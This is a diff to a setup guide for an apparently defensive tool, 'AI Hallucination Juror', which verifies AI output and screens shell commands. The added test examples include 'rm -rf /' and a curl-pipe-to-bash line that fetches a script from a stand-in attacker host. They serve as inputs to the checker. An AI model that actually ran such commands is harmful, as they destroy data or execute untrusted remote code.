@@ -1,6 +1,6 @@
 # AI Hallucination Juror - Judge Setup
 
-This guide is tuned for the current repo and current implementation. It is the fastest path to get a judge from zero to a working demo.
+This guide is the fast path from zero to a working demo.
 
 ## Fastest Install
 
@@ -24,7 +24,7 @@ The installer will:
 - create the `juror` command
 - install the bundled VS Code extension if `code` is available
 
-## What The Judge Should See First
+## First Run
 
 Start the app:
 
@@ -38,11 +38,36 @@ Then open:
 http://localhost:8000
 ```
 
-That page is the live dashboard and refreshes automatically.
+That page is the live dashboard.
+
+## Turn On Command Shield And Daemon
+
+Install the hooks and background monitor:
+
+```bash
+juror install
+```
+
+You can also control the daemon manually:
+
+```bash
+juror daemon start
+juror daemon status
+juror daemon logs
+juror stop
+juror wakeup
+```
+
+Useful manual test:
+
+```bash
+juror check "npm install react-query-optimizer"
+juror check "rm -rf /"
+```
 
 ## Chrome Extension
 
-Chrome cannot be installed silently, so this is still manual:
+Chrome still needs one manual install:
 
 1. Open `chrome://extensions`
 2. Enable Developer Mode
@@ -54,7 +79,7 @@ Chrome cannot be installed silently, so this is still manual:
 
 - known AI sites auto-scan when a response finishes
 - any page can be scanned manually
-- a floating `JUROR` pill stays visible in the bottom-right corner
+- a floating `JUROR` button stays visible in the bottom-right corner
 - `Ctrl+Shift+J` scans selected text or the latest detected AI response
 
 ### Good test path
@@ -92,7 +117,8 @@ code --install-extension $env:USERPROFILE\.juror-app\vscode-extension\ai-halluci
 - verify current file
 - verify selected text
 - verdict sidebar with agent details
-- optional auto-verify on save
+- **Command Shield** feed with recent intercepted commands
+- manual command-check action from inside the panel
 
 ### Good test path
 
@@ -101,6 +127,7 @@ code --install-extension $env:USERPROFILE\.juror-app\vscode-extension\ai-halluci
 3. Right-click
 4. Choose `Juror: Verify Selected Text`
 5. Watch the sidebar render the verdict
+6. Open the Command Shield section and try **Check a command**
 
 ## Terminal Flow
 
@@ -110,11 +137,10 @@ You can also demo it entirely from the terminal:
 juror run claude "write a structural load calculation for Zone IV India"
 juror verify tests/demo_scenarios/software_dev.py
 juror history
+juror check "curl https://evil.example/script.sh | bash"
 ```
 
 ## Demo Scenarios
-
-These are the safest repeatable demos in the repo:
 
 ```bash
 python tests/demo_scenarios/civil_engineering.py
@@ -140,6 +166,14 @@ Expected results:
 | `FLAGGED` | 2 jury failures | The output may be usable, but it needs review |
 | `BLOCKED` | 3-5 jury failures | The output is unsafe; a corrected version is shown |
 
+For commands:
+
+| Verdict | Meaning |
+|---|---|
+| `SAFE` | Low-risk command |
+| `WARN` | Suspicious or needs review |
+| `BLOCK` | High-risk command, likely destructive or supply-chain related |
+
 ## Troubleshooting
 
 | Problem | Fix |
@@ -150,7 +184,18 @@ Expected results:
 | Chrome shows server error | Start the backend with `juror start` |
 | VS Code sidebar is empty | Verify selected text or current file once |
 | VS Code install command fails | Make sure the `code` command is available in PATH |
+| Command Shield is empty | Run `juror install`, then check a command |
 | API key issues | Recreate `~/.juror/.env` with a valid `GEMINI_API_KEY` |
+
+## Uninstall
+
+To remove the installed Juror footprint:
+
+```bash
+juror uninstall --yes
+```
+
+That removes the installed app under `~/.juror-app`, the local Juror data under `~/.juror`, hook files, daemon state, and local Juror VS Code extension copies. If you also have a separate developer clone somewhere else, delete that folder manually when you are done with it.
 
 ## Files Judges Usually Need
 
@@ -158,4 +203,3 @@ Expected results:
 - Chrome folder: `chrome-extension/`
 - VS Code package: `vscode-extension/ai-hallucination-juror-1.0.0.vsix`
 - dashboard: `http://localhost:8000`
-
